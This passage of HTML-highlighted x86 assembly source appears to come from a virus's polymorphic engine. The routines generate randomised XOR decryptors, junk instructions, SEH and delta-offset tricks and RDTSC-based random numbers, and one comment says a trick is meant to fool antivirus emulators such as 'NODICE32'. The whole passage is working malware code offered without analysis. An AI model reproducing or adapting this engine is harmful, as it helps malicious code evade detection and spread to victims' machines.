    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_byte_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                </span><span class="sc1">;generate INC DWORD PTR</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_dw_</span><span class="sc0">
</span><span class="sc5">_byte_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                </span><span class="sc1">;generate INC BYTE PTR</span><span class="sc0">
</span><span class="sc5">_dw_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;store register</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">                </span><span class="sc1">;generate JUMP SHORT</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">24d</span><span class="sc0">                </span><span class="sc1">;generate jump to start of code (trick</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;for better emulators, e.g. NODICE32)</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;generate junx</span><span class="sc0">
</span><span class="sc5">greg1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;generate random register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;MUST NOT be EBP</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;store it</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;generate XOR,SUB reg, reg or MOV reg, 0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc0">             </span><span class="sc1">;next SEH instructions</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8fh</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">                </span><span class="sc1">;generate CALL</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;store for l8r use</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;call junk generator</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;random register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;random number (0-1)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_delta</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">             </span><span class="sc1">;generate MOV reg, [ESP]; POP EAX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bdelta</span><span class="sc0">

</span><span class="sc5">next_delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;generate POP reg; SUB reg, ...</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">58h</span><span class="sc0">
</span><span class="sc5">bdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;random junx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;parameter (first execution only)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">              </span><span class="sc1">;generate MOV sourcereg, ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;generate ADD sourcereg, deltaoffset</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;store EBX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">              </span><span class="sc1">;generate MOV countreg, ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;store count register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;restore EBX</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">              </span><span class="sc1">;generate MOV keyreg, ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;store this position for jump to decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">             </span><span class="sc1">;generate XOR [sourcereg], keyreg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                  </span><span class="sc1">;this stuff will choose ordinary of calls</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;to code generators</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g5</span><span class="sc0">                   </span><span class="sc1">;GREG4 - key incremention</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;GREG5 - source incremention</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g1</span><span class="sc0">                   </span><span class="sc1">;GREG6 - count decremention</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;GREG7 - decryption loop</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g4</span><span class="sc0">

</span><span class="sc5">g0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
</span><span class="sc5">gg3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_out</span><span class="sc0">
</span><span class="sc5">g4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
</span><span class="sc5">g_out</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg4</span><span class="sc0">
</span><span class="sc5">g_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">             </span><span class="sc1">;generate POPAD instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;junk instruction generator</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                </span><span class="sc1">;RET instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;calculate size of decryptor and encrypted data</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store it to EAX register</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and thats all folx</span><span class="sc0">
</span><span class="sc5">get_reg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;this procedure generates random register</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;random number (0-7)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">              </span><span class="sc1">;MUST NOT be 0 (=EAX is used as junk register)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100b</span><span class="sc0">                </span><span class="sc1">;MUST NOT be ESP</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">get_reg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">make_xor</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                   </span><span class="sc1">;this procedure will generate instruction, that</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">;will nulify register (BL as parameter)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_sub_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_mov_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">             </span><span class="sc1">;generate XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_xor_</span><span class="sc0">
</span><span class="sc5">_sub_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2bh</span><span class="sc0">             </span><span class="sc1">;generate SUB reg, reg</span><span class="sc0">
</span><span class="sc5">_xor_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_mov_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">;generate MOV reg, 0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">make_xor</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">gg1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
</span><span class="sc5">gg2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;this procedure will generate random number</span><span class="sc0">
                        </span><span class="sc1">;in range from 0 to pushed_parameter-1</span><span class="sc0">
                        </span><span class="sc1">;0 = do not truncate result</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save EDX</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">             </span><span class="sc1">;RDTCS instruction - reads PSs tix and stores</span><span class="sc0">
                        </span><span class="sc1">;number of them into pair EDX:EAX</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;nulify EDX, we need only EAX</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;is parameter==0 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_out</span><span class="sc0">                </span><span class="sc1">;yeah, do not truncate result</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;divide it</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">;remainder as result</span><span class="sc0">
</span><span class="sc5">r_out</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;restore EDX</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">                </span><span class="sc1">;quit procedure and destroy pushed parameter</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">make_xor2</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                  </span><span class="sc1">;create XOR instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">make_xor2</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg2</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;1 parameter = source/count value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;get register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;already used ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get parameter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                  </span><span class="sc1">;choose instructions</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
